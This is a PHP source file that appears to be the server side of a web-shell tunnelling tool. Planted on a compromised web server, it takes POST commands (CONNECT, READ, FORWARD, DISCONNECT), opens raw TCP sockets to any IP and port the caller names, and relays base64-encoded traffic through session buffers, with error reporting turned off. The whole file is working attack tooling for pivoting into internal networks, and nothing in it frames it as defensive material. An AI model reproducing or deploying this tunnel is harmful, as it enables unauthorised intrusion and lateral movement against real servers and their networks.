@error_reporting(0);
function main($cmd,$targetIP="",$targetPort="",$socketHash="",$extraData="MTIz")
{
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
if (function_exists('dl'))
{
	dl("php_sockets.dll");
}
if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
                    foreach($rx_matches as $ak_key => $ak_val) {
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }
                    $arh_key = implode('-', $rx_matches);
                }
                $arh[$arh_key] = $val;
            }
        }
        return( $arh );
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	set_time_limit(0);
	$headers=apache_request_headers();
    switch($cmd){
		case "CONNECT":
			{
				$target = $targetIP;
				$port = (int)$targetPort;
				$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
				if ($sock === false)
				{
					echo "\x37\x21\x49\x36Failed creating socket";
					return;
				}
				$res = @socket_connect($sock, $target, $port);
                if ($res === false)
				{
					echo "\x37\x21\x49\x36Failed connecting to target";
					return;
				}
				socket_set_nonblock($sock);
				@session_start();
				$_SESSION["run"."_".$socketHash] = true;
                $_SESSION["writebuf"."_".$socketHash] = "";
                $_SESSION["readbuf"."_".$socketHash] = "";

                ob_end_clean();
                header("Connection: close");
                ignore_user_abort();
                ob_start();
                $size = ob_get_length();
                header("Content-Length: $size");
                ob_end_flush();
                flush();
                session_write_close();
                //fastcgi_finish_request();

				while ($_SESSION["run"."_".$socketHash])
				{
					$readBuff = "";
					@session_start();
					$writeBuff = $_SESSION["writebuf"."_".$socketHash];
					$_SESSION["writebuf"."_".$socketHash] = "";
					session_write_close();
                    if ($writeBuff != "")
					{
						$i = socket_write($sock, $writeBuff, strlen($writeBuff));
						if($i === false)
						{
							@session_start();
                            $_SESSION["run"."_".$socketHash] = false;
                            session_write_close();
							echo "\x37\x21\x49\x36Failed writing socket";
						}
					}
					while ($o = socket_read($sock, 512)) {
					if($o === false)
						{
                            @session_start();
                            $_SESSION["run"."_".$socketHash] = false;
                            session_write_close();
							echo "\x37\x21\x49\x36Failed reading from socket";
						}
						$readBuff .= $o;
					}
                    if ($readBuff!=""){
                        @session_start();
                        $_SESSION["readbuf"."_".$socketHash] .= $readBuff;
                        session_write_close();
                    }
                    #sleep(0.2);
				}
                socket_close($sock);
			}
			break;
		case "DISCONNECT":
			{
                error_log("DISCONNECT recieved");
				@session_start();
				$_SESSION["run"."_".$socketHash] = false;
				session_write_close();
				return;
			}
			break;
		case "READ":
			{
				@session_start();
				$readBuffer = $_SESSION["readbuf"."_".$socketHash];
                $_SESSION["readbuf"."_".$socketHash]="";
                $running = $_SESSION["run"."_".$socketHash];
				session_write_close();
                if ($running) {
                    header("Connection: Keep-Alive");
					echo $readBuffer;
					return;
				} else {
                    echo "\x37\x21\x49\x36RemoteSocket read filed";
					return;
				}
			}
			break;
		case "FORWARD":
			{
                @session_start();
                $running = $_SESSION["run"."_".$socketHash];
				session_write_close();
                if(!$running){
					echo "\x37\x21\x49\x36No more running, close now";
                    return;
                }
                header('Content-Type: application/octet-stream');
				$rawPostData = base64_decode($extraData);
				if ($rawPostData) {
					@session_start();
					$_SESSION["writebuf"."_".$socketHash] .= $rawPostData;
					session_write_close();
                    header("Connection: Keep-Alive");
					return;
				} else {
					echo "\x37\x21\x49\x36POST request read filed";
				}
			}
			break;
	}
}
}